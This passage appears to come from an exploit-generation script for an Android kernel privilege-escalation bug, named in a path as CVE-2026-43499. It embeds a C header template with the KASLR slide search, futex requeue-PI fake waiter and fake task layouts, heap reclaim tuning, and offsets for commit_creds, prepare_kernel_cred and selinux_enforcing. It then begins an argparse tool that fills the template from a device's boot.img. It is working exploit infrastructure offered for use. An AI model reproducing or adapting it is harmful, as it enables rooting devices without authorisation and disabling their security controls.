#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define FOPS_ROUTE_FINE_DELAY_TICKS \
  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
#define PRODUCTION_STACK_PI_RIGHT_ONLY 1

#define DEFAULT_EXPLOIT_ATTEMPTS 8
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200

/* ---------------------------------------------------------------------------
 * Kernel virtual address map
 * ------------------------------------------------------------------------- */
#define KIMAGE_TEXT_BASE __BASE__
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET __PHYS_OFF__
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD __KERNEL_PHYS__
#endif

#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ---------------------------------------------------------------------------
 * P0 physical oracle (configfs gate/probe slots)
 * ------------------------------------------------------------------------- */
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET __PROBE_OFF__
#define P0_FINGERPRINT_HEADER \
  "targets/__PROFILE__/p0_fingerprint.h"

/* ---------------------------------------------------------------------------
 * KASLR slide (p0 offset candidates + tracefs worker)
 * ------------------------------------------------------------------------- */
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, __PROBE_OFF__
#define SLIDE_MAX_ATTEMPTS 32
#define SLIDE_KASLR_STEP __MM_SZ__0ULL
#define SLIDE_TRACEFS_EVENT_ID __EVENT_ID__
#define SLIDE_TRACEFS_WORKER_CALLER_OFF __WORKER_CALL__ULL

/* ---------------------------------------------------------------------------
 * Slide / requeue-PI mechanism
 * ------------------------------------------------------------------------- */
#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAIT_NSEC 2000000000L
#define SLIDE_REQUEUE_ARM_USEC 20000
#define SLIDE_USE_FAKE_TASK 1
__WAITER_FLAG__#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL

/* --- slide kernelsnitch tuning ------------------------------------------- */
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8

/* --- controlled-mm bank layout ------------------------------------------- */
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40

/* ---------------------------------------------------------------------------
 * Collision / reclaim tuning (device-specific)
 * ------------------------------------------------------------------------- */
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define SLIDE_RECLAIM_SENDS 64

/* ---------------------------------------------------------------------------
 * Root escalation (cred offsets + usermode-helper)
 * ------------------------------------------------------------------------- */
#define TASK_STRUCT_CRED_OFF      __TASK_CRED__ULL
#define TASK_STRUCT_REAL_CRED_OFF __TASK_REAL_CRED__ULL
#define FAKE_TASK_TASK_GROUP_OFF  __TASK_SCHED_TG__ULL

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* ---------------------------------------------------------------------------
 * Static kernel symbol offsets (text-relative)
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK_OFF             __INIT_TASK__ULL
#define PREPARE_KERNEL_CRED_OFF   __PREPARE_CRED__ULL
#define COMMIT_CREDS_OFF          __COMMIT_CREDS__ULL
#define OVERRIDE_CREDS_OFF        __OVERRIDE_CREDS__ULL
#define ROOT_TASK_GROUP_OFF       __ROOT_TG__ULL
#define SELINUX_ENFORCING_OFF     __SELINUX__ULL
#define KMALLOC_CACHES_OFF        __KMALLOC__ULL
#define ANON_PIPE_BUF_OPS_OFF     __ANON_PIPE__ULL
#define SYSTEM_UNBOUND_WQ_OFF     __UNBOUND_WQ__ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF __UMH__ULL

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_FOPS_OFF           __ASHMEM_FOPS__ULL
#define ASHMEM_MISC_FOPS_OFF      __ASHMEM_MISC_FOPS__ULL
#define ASHMEM_IOCTL_OFF          __ASHMEM_IOCTL__ULL
#define ASHMEM_COMPAT_IOCTL_OFF   __ASHMEM_COMPAT__ULL
#define ASHMEM_MMAP_OFF           __ASHMEM_MMAP__ULL
#define ASHMEM_OPEN_OFF           __ASHMEM_OPEN__ULL
#define ASHMEM_RELEASE_OFF        __ASHMEM_REL__ULL
#define ASHMEM_SHOW_FDINFO_OFF    __ASHMEM_FDINFO__ULL
#define CONFIGFS_READ_ITER_OFF    __CFG_READ__ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF __CFG_WRITE__ULL
#define COPY_SPLICE_READ_OFF      __SPLICE__ULL
#define NOOP_LLSEEK_OFF           __NOOP_LLSEEK__ULL

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_OFF __NFULNL_NAME__ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF __NFULNL_OBJ__ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF __BOOTID_DATA__ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF __SYSCTL_BOOTID__ULL

/* ---------------------------------------------------------------------------
 * Derived image addresses (KIMAGE_TEXT_BASE + offset)
 * ------------------------------------------------------------------------- */
/* --- global / root symbols ------------------------------------------------ */
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)

/* --- ashmem / configfs / fops gadgets ------------------------------------- */
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)

/* --- slide leak symbols ---------------------------------------------------- */
#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------------------------------------------------------------------
 * Payload page layout (controlled-mm scratch page)
 * ------------------------------------------------------------------------- */
#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* --- fake rt_mutex_waiter layout ------------------------------------------ */
__FAKE_WAITER_BLOCK__
/* --- fake task_struct layout ---------------------------------------------- */
__FAKE_TASK_BLOCK__
/* ---------------------------------------------------------------------------
 * configfs (configfs_bin_buffer) struct layout
 * ------------------------------------------------------------------------- */
__CFG_BLOCK__
/* ---------------------------------------------------------------------------
 * workqueue / worker-pool layout
 * ------------------------------------------------------------------------- */
__WQ_BLOCK__
/* --- work_struct layout ---------------------------------------------------- */
__WORK_BLOCK__
/* ---------------------------------------------------------------------------
 * struct page layout
 * ------------------------------------------------------------------------- */
__PAGE_BLOCK__
/* ---------------------------------------------------------------------------
 * pipe buffer
 * ------------------------------------------------------------------------- */
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ---------------------------------------------------------------------------
 * file_operations struct layout
 * ------------------------------------------------------------------------- */
__FOPS_BLOCK__#endif
"""


def main():
    ap = argparse.ArgumentParser(
        description="generate target.h and p0_fingerprint.h from boot.img "
                    "plus firmware load-address info")
    ap.add_argument('--boot', required=True, type=Path,
                    help="Android boot.img (required)")
    ap.add_argument('--xbl-config', type=Path,
                    help="Qualcomm xbl_config partition image: derives "
                         "P0_PHYS_OFFSET and P0_KERNEL_PHYS_LOAD from its "
                         "DTB memory map")
    ap.add_argument('--sboot', type=Path,
                    help="decompressed sboot.bin (derives P0_KERNEL_PHYS_LOAD)")
    ap.add_argument('--out', type=Path,
                    help="output dir (default src/targets/<profile>)")
    ap.add_argument('--profile', required=True,
                    help="device-build profile directory name")
    ap.add_argument('--model',
                    help="hardware model (default: build id)")
    ap.add_argument('--fingerprint', required=True,
                    help="ro.build.fingerprint")

